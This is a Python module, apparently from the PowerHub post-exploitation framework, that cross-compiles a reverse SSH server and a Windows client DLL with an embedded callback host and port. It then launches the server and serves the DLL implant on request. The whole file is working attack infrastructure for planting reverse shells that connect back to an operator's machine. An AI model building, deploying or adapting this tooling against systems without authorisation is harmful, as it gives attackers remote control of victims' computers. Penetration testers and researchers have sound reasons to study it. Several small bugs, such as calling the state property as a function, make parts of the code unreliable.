import logging
from enum import Enum, auto
import os
import shutil
import subprocess
import threading

from powerhub.directories import directories

log = logging.getLogger(__name__)

RSSH_EXT_DIR = os.path.join(directories.BASE_DIR, 'ext', 'reverse_ssh')


class HandlerState(Enum):
    OFFLINE = auto()
    BUILDING = auto()
    ONLINE = auto()


class ShellHandler(object):
    def __init__(self):
        self._state = HandlerState.OFFLINE
        self._thread = None
        self._thread_result = None
        self._proc = None
        self._build_lock = threading.Lock()

    @property
    def state(self):
        return self._state

    def build(self, host, port):
        log.info("Building rssh binaries...")
        if not self.check_dependencies():
            log.error("Unable to build; missing dependencies")
            return

        home_server = "%s:%d" % (host, port)
        cmd = [shutil.which('make'), '-C', RSSH_EXT_DIR]
        env = dict(
            KEY_DIR=directories.RSSH_DIR,
            BUILD_DIR=directories.RSSH_DIR,
            CC=shutil.which('x86_64-w64-mingw32-gcc'),
            GOOS='windows',
            HOME=os.environ.get("HOME", ""),
            RSSH_HOMESERVER=home_server,
            #  RSSH_PROXY=foobar:1080,
        )

        commands = [
            (
                cmd + ['server'],
                {**env, 'GOOS': 'linux'},
                'server',
            ),
            (
                cmd + ['client_dll'],
                env,
                'client.dll',
            ),

        ]

        thread = threading.Thread(
            target=self._build,
            args=(commands, host, port),
        )
        thread.start()

    def _build(self, commands, host, port):
        self._state = HandlerState.BUILDING
        try:
            for cmd, env, product in commands:
                p = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, encoding='utf-8')
                stdout, stderr = p.communicate()

                if p.returncode:
                    raise RuntimeError("Build failed: %s" % stderr)

                # Rename the build files to include host and port
                os.rename(
                    os.path.join(directories.RSSH_DIR, product),
                    os.path.join(directories.RSSH_DIR, '%s-%d-%s' % (host, port, product)),
                )
        except Exception:
            self._state = HandlerState.OFFLINE
            raise

        self._state = HandlerState.OFFLINE
        log.info("Finished building rssh binaries successfully")

    def check_dependencies(self):
        """Check whether the necessary dependencies are available"""
        dependencies = [
            'make',
            'go',
            'ssh',
            'ssh-keygen',
            'x86_64-w64-mingw32-gcc',
        ]

        result = True

        for dep in dependencies:
            if not shutil.which(dep):
                result = False
                log.error("Dependency not found: %s" % dep)

        return result

    def is_ready(self, host, port):
        """Check whether the binaries have been built"""
        result = all(
            os.path.exists(os.path.join(
                directories.RSSH_DIR,
                '%s-%d-%s' % (host, port, path),
            )) for path in [
                'client.dll',
                'server',
            ]
        )
        return result

    def run(self, host, port):
        if self.state() == HandlerState.ONLINE:
            log.info("Handler already running")
            return

        if not self.is_ready(host, port):
            self.build(host, port)

        cmd = os.path.join(
            directories.RSSH_DIR,
            '%s-%d-%s' % (host, port, 'server'),
        )

        def store_result(func):
            self._thread_result = func()

        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self._thread = threading.Thread(
            target=store_result,
            args=(self._proc.communicate,),
        )
        self._thread.start()

        self._state = HandlerState.ONLINE

    def stop(self):
        if self.state() != HandlerState.ONLINE:
            log.info("Handler not running")
            return

        if self._proc:
            self._proc.terminate()
            self._state = HandlerState.OFFLINE

    def get_client_dll(self, host, port):
        if self.state != HandlerState.ONLINE:
            log.error("RSSH Handler is not ready")
            return

        path = os.path.join(
            directories.RSSH_DIR,
            '%s-%d-%s' % (host, port, 'client.dll'),
        )
        result = open(path, 'rb').read()
        return result

    def request_client_dll(self, host, port):
        """Returns either the client_dll or an error code

        This is handled here to avoid race conditions, because the build
        process is run in a separate thread.
        """

        try:
            self._build_lock.acquire()

            if self.state == HandlerState.ONLINE:
                response = self.get_client_dll(host, port)
            elif self.state == HandlerState.BUILDING:
                response = b"still_building"
            # State is OFFLINE
            elif self.is_ready(host, port):
                self.run(host, port)
                response = self.get_client_dll(host, port)
            else:
                self.build(host, port)
                response = b"now_building"

            return response
        finally:
            self._build_lock.release()
